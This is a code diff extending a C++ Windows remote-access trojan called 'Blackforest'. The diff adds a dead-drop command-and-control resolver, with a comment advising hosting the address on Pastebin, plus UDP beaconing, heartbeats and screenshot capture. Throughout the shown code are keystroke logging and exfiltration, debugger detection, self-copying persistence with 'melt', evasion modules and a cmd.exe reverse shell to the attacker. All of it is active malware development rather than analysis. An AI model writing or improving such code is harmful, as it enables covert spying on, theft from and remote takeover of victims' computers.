@@ -13,6 +13,9 @@
 #include "core/maintenance/updater.hpp" // New
 #include "core/evasion/timestomp.hpp"   // New
 #include "core/persistence/scheduled_task.hpp" // New
+#include "exfil/dead_drop.hpp" // New
+#include "core/evasion/process_migration.hpp" // New
+#include "exfil/beacon.hpp" // New
 
 #include <iostream>
 #include <vector>
@@ -24,6 +27,9 @@
 #include <tlhelp32.h>
 #include <iomanip>
 #include <sstream>
+#include <gdiplus.h> // For screenshot GDI+
+
+#pragma comment(lib, "gdiplus.lib")
 
 // Simple Base64 Encoder
 static const std::string base64_chars = 
@@ -131,10 +137,29 @@ private:
     
 public:
     // C2 Configuration
-    // Replace "127.0.0.1" with the USER DESIGNATED IP
-    // Replace "127.0.0.1" and "example.com" with REAL C2 config
+    // Dead Drop Resolver: Fetch IP from Public URL
     Blackforest() : poly(1234), dns("example.com"), tcp("192.168.0.3", 4444), secureLog(poly, dns, tcp) {
         if(CheckDebuggers()) exit(0);
+        
+        // 1. Resolve C2 from Dead Drop
+        // NOTE: In production, upload a text file with "192.168.0.3:4444" to Pastebin
+        // and put the RAW URL here.
+        std::string masterUrl = "http://192.168.0.3/c2.txt"; 
+        
+        std::string resolved = DeadDrop::Resolve(masterUrl);
+        if(!resolved.empty()) {
+             size_t colon = resolved.find(':');
+             if(colon != std::string::npos) {
+                 std::string ip = resolved.substr(0, colon);
+                 int port = std::stoi(resolved.substr(colon+1));
+                 tcp.SetTarget(ip, port); // Update Target
+                 std::cout << "[*] Resolved C2: " << ip << ":" << port << std::endl;
+             }
+        } else {
+             // Fallback
+             tcp.SetTarget("192.168.0.3", 4444);
+             std::cout << "[!] Dead Drop Failed. Using Fallback." << std::endl;
+        }
     }
     
     void Start() {
@@ -147,10 +172,16 @@ public:
         secureLog.ExfiltrateDirect("[*] Blackforest Agent Started on: " + SystemInfo::GetHostName());
         secureLog.ExfiltrateDirect("INFO: " + SystemInfo::GetAllInfo());
         
+        // Initialize GDI+ for screenshots (once, not per-capture)
+        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+        ULONG_PTR gdiplusToken;
+        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+        
         std::thread keyThread(&Blackforest::KeyMonitor, this);
-        std::thread sysThread(&Blackforest::SystemMonitor, this);
         std::thread screenThread(&Blackforest::ScreenMonitor, this);
         std::thread fileThread(&Blackforest::FileMonitor, this);
+        std::thread heartbeatThread(&Blackforest::StartHeartbeat, this);
+        std::thread beaconThread(&Blackforest::StartBeacon, this); // UDP Broadcast
         
         // Spawn Interactive Shell on Port 4445
         // This connects cmd.exe directly to attacker ip:4445
@@ -188,9 +219,13 @@ public:
         }
         
         keyThread.join();
-        sysThread.join();
         screenThread.join();
         fileThread.join();
+        heartbeatThread.join();
+        beaconThread.join();
+        
+        // Cleanup GDI+
+        Gdiplus::GdiplusShutdown(gdiplusToken);
     }
     
 private:
@@ -204,11 +239,11 @@ private:
         if(!ExpandEnvironmentStringsA("%APPDATA%\\Blackforest", destPath, MAX_PATH)) return;
         
         CreateDirectoryA(destPath, NULL);
-        strcat(destPath, "\\Blackforest.exe");
+        strncat(destPath, "\\Blackforest.exe", MAX_PATH - strlen(destPath) - 1);
         
         // Copy Self
         // If we are already running from dest, skip
-        if(strcasecmp(currentPath, destPath) != 0) {
+        if(_stricmp(currentPath, destPath) != 0) {
             CopyFileA(currentPath, destPath, FALSE);
         }
 
@@ -219,7 +254,7 @@ private:
         }
         
         // MELT: If we are not running from AppData/Blackforest, run the installed one and exit
-        if(strcasecmp(currentPath, destPath) != 0) {
+        if(_stricmp(currentPath, destPath) != 0) {
             STARTUPINFOA si = { sizeof(si) };
             PROCESS_INFORMATION pi;
             // Create the persistent process
@@ -268,7 +303,7 @@ private:
             if (!pendingKeys.empty()) {
                 // INSTANT MODE: Flush if ANY key is in buffer (>= 1)
                 // Also added debug print to verify hook
-                if(elapsed >= 1 || pendingKeys.length() >= 1 || pendingKeys.back() == '\n') {
+                if(elapsed >= 5 || pendingKeys.length() >= 50 || pendingKeys.back() == '\n') {
                      // std::cout << "Sending: " << pendingKeys << std::endl; // Debug
                      secureLog.ExfiltrateDirect("[KEYLOG]: " + pendingKeys);
                      pendingKeys.clear();
@@ -280,13 +315,20 @@ private:
         }
     }
     
-    void SystemMonitor() {
+    void StartHeartbeat() {
         while(running) {
-            Sleep(60000); 
-             secureLog.ExfiltrateDirect("HEARTBEAT: " + SystemInfo::GetIPAddress());
+             secureLog.ExfiltrateDirect("[*] Heartbeat: " + SystemInfo::GetHostName());
+             Sleep(60000); 
         }
     }
     
+    void StartBeacon() {
+        while(running) {
+             Beacon::Shout();
+             Sleep(30000); // Shout every 30s
+        }
+    }
+
     void ScreenMonitor() {
         while(running) {
             Sleep(30000); 
